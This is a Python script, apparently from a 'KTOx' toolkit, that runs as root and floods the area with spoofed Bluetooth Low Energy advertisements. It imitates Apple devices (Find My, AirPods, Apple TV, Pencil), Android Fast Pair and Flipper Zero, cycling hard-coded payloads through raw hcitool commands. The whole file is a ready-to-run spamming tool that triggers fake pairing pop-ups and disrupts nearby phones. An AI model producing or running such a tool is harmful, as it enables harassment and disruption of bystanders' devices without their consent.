#!/usr/bin/env python3
"""
BLE Spammer Utility for KTOx
Author: JustAnotherHacker
License: MIT
"""

import subprocess
import argparse
import sys
import time
import signal
import os

# --- Check for root ---
if os.geteuid() != 0:
    print("This script must be run as root.", file=sys.stderr)
    sys.exit(1)

# --- Advertising Data Payloads ---
# Sourced from public research and repositories (Flipper Zero, etc.)
# Each item is a full advertising packet payload (excluding the initial HCI command)
SPAM_DATA = {
    "apple": [
        "1e0201061aff4c000f05c1092000c20100c3021900c5020800c00109", # Find My
        "1e0201061aff4c000f05c10a2000c20100c3021900c5020800c0010a", # Apple TV
        "1e0201061aff4c000f05c10b2000c20100c3021900c5020800c0010b", # AirPods
        "1e0201061aff4c000f05c10c2000c20100c3021900c5020800c0010c", # Apple Pencil
    ],
    "android": [
        "170201060303e1fe1316e1fe00010101010101010101010101", # Fast Pair
        "170201060303e1fe1316e1fe00020202020202020202020202", # Fast Pair
    ],
    "flipper": [
        "1e0201041aff8000090400000000000000000000000000000000000000000000", # Flipper Animation
    ]
}

# --- Global State ---
RUNNING = True
BT_INTERFACE = "hci0"

def run_command(cmd):
    """Runs a command and handles errors."""
    try:
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {cmd}\n{e}", file=sys.stderr)
        return False
    return True

def signal_handler(sig, frame):
    """Handle Ctrl+C to stop gracefully."""
    global RUNNING
    print("\nStopping BLE spam...")
    RUNNING = False

def main(spam_type):
    """Main spamming loop."""
    print(f"Starting BLE spam for type: {spam_type}")
    
    payloads = SPAM_DATA.get(spam_type)
    if not payloads:
        print(f"Error: Unknown spam type '{spam_type}'", file=sys.stderr)
        print(f"Available types: {', '.join(SPAM_DATA.keys())}", file=sys.stderr)
        sys.exit(1)

    # 1. Bring interface up
    if not run_command(f"hciconfig {BT_INTERFACE} up"):
        sys.exit(1)

    payload_index = 0
    while RUNNING:
        payload = payloads[payload_index]
        
        # 2. Set advertising data using hcitool raw command
        # OG_HCI_LE_SET_ADVERTISING_DATA_CMD = 0x08 0x0008
        cmd = f"hcitool -i {BT_INTERFACE} cmd 0x08 0x0008 {payload}"
        if not run_command(cmd):
            time.sleep(1)
            continue

        # 3. Enable LE advertising
        # OG_HCI_LE_SET_ADVERTISE_ENABLE_CMD = 0x08 0x000A
        if not run_command(f"hcitool -i {BT_INTERFACE} cmd 0x08 0x000a 01"):
            time.sleep(1)
            continue
        
        time.sleep(0.2) # Time between sending different packets
        
        # 4. Disable LE advertising to change payload
        if not run_command(f"hcitool -i {BT_INTERFACE} cmd 0x08 0x000a 00"):
            time.sleep(1)
            continue

        payload_index = (payload_index + 1) % len(payloads)

    # --- Cleanup ---
    print("Cleaning up Bluetooth interface...")
    run_command(f"hcitool -i {BT_INTERFACE} cmd 0x08 0x000a 00") # Disable advertising
    run_command(f"hciconfig {BT_INTERFACE} down")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="KTOx BLE Spammer")
    parser.add_argument("--type", type=str, required=True, help="Type of spam to perform (e.g., apple, android, flipper)")
    args = parser.parse_args()
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    main(args.type)
